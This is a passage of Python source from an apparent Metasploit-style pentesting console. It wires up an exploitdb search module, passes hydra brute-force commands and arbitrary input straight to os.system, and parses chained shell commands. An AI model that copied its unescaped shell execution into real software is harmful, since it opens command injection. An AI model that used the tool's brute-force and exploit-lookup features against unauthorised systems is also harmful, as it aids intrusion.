    		os.system("python3 $intweb/main.py")
    	if action == "uninstall":
    		os.system("""
rm -rf $intweb
    		""")
    if help_input.startswith("exploitdb"):
        s = help_input[10:]  # Remove "exploitdb " from the input

        if not s.strip():
            print("[!] Error: No arguments provided. Use '-h' for help.")
            pass

        # Build command dynamically
        command = f"python3 {intframework_path}/modules/commands/exploitdb.py"

        parts = s.split()
        valid_flags = ["-h","-s", "--search", "-p", "--platform", "-y", "--year",
                       "-t", "--type", "-a", "--author", "-i", "--id",
                       "-l", "--limit", "-v", "--verbose", "-c", "--code",
                       "-T", "--table", "-S", "--save"]

        i = 0
        while i < len(parts):
            if parts[i] in valid_flags:
                # If flag is a standalone switch (like -v, -c, -T), just add it
                if parts[i] in ["-v", "--verbose", "-c", "--code", "-T", "--table"]:
                    command += f" {parts[i]}"
                else:
                    # Ensure the next item is a value
                    if i + 1 < len(parts):
                        command += f" {parts[i]} {parts[i+1]}"
                        i += 1
                    else:
                        print(f"[!] Error: Missing value for {parts[i]}.")
                        break
            else:
                print(f"[!] Warning: Ignoring unknown argument '{parts[i]}'.")
            i += 1

        print(f"[*] Running: {command}")
        os.system(command)
    if help_input in help:
    	os.system("help")
    if help_input == "exit" or help_input == "quit":
    	sys.exit()
    if not any(help_input.startswith(command) for command in valid_commands):
    	t.sleep(0.75)
    	if help_input.startswith("hydra"):
    		os.system(help_input)
    		add_job("working hydra")
    		pass
    	if help_input.startswith("ls"):
    		os.system(help_input)
    		add_job(help_input)
    		pass
    	if help_input.startswith("cd"):
    		os.system(help_input)
    		add_job(help_input)
    		pass
    	if help_input.startswith("int"): 
    		os.system(help_input)
    		add_job(help_input)
    		pass
    	print(f"{Fore.GREEN}[+] Running command: {help_input}")
    	os.system(help_input)
    	add_job(help_input)
    else:
    	pass
    try:
    	if st == "started":
    		db_connect()
    except:
    	pass




import threading

def parse_and_execute(help_input):
    """
    Execute commands with ;, &&, || and & support.
    Background (&) commands run in a thread.
    Shows Metasploit-style error messages.
    """
    chains = help_input.split(";")
    last_exit_code = 0

    for chain in chains:
        and_parts = chain.strip().split("&&")
        skip_and = False

        for part in and_parts:
            or_parts = part.strip().split("||")
            executed = False

            for cmd in or_parts:
                background = cmd.endswith("&")
                cmd = cmd.rstrip("&").strip()

                if not skip_and:
                    try:
                        if background:
                            threading.Thread(target=command_handler, args=(cmd,)).start()
                            last_exit_code = 0
                        else:
                            command_handler(cmd)
                            last_exit_code = 0
                        executed = True
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error executing '{cmd}': {e}{Style.RESET_ALL}")
                        last_exit_code = 1

                # OR (||) kontrolü
                if last_exit_code == 0:
                    skip_and = False
                    break
                else:
                    skip_and = True

            # AND (&&) kontrolü
            if last_exit_code != 0:
                break

# --- Main loop ---
while True:
    try:
        try:
            raw_input_text = session.prompt(get_prompt(), completer=completer)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] User interrupted input (Ctrl+C){Style.RESET_ALL}")
            continue
        except EOFError:
            print(f"\n{Fore.CYAN}[!] Session closed (Ctrl+D). Exiting...{Style.RESET_ALL}")
            goodbye()
            break
        except Exception as e:
            print(f"{Fore.RED}[!] Error executing input: {e}{Style.RESET_ALL}")
            continue

        # Multi-line input temizleme
        try:
            help_input = "\n".join(
                line.strip() for line in raw_input_text.splitlines() if line.strip()
            )
        except Exception as e:
            print(f"{Fore.RED}[!] Error processing input: {e}{Style.RESET_ALL}")
            continue

        if not help_input:
            continue  # Skip empty input

        # Zincirleme komut çalıştır
        try:
        	parse_and_execute(help_input)
        except KeyboardInterrupt:
        	print(f"\n{Fore.YELLOW}[!] User interrupted input (Ctrl+C){Style.RESET_ALL}")
        	pass
        except Exception as outer_e:
            print(f"{Fore.MAGENTA}[!] Unexpected error: {outer_e}{Style.RESET_ALL}")
            continue
    except Exception as outer_e:
        print(f"{Fore.MAGENTA}[!] Unexpected error: {outer_e}{Style.RESET_ALL}")
        continue        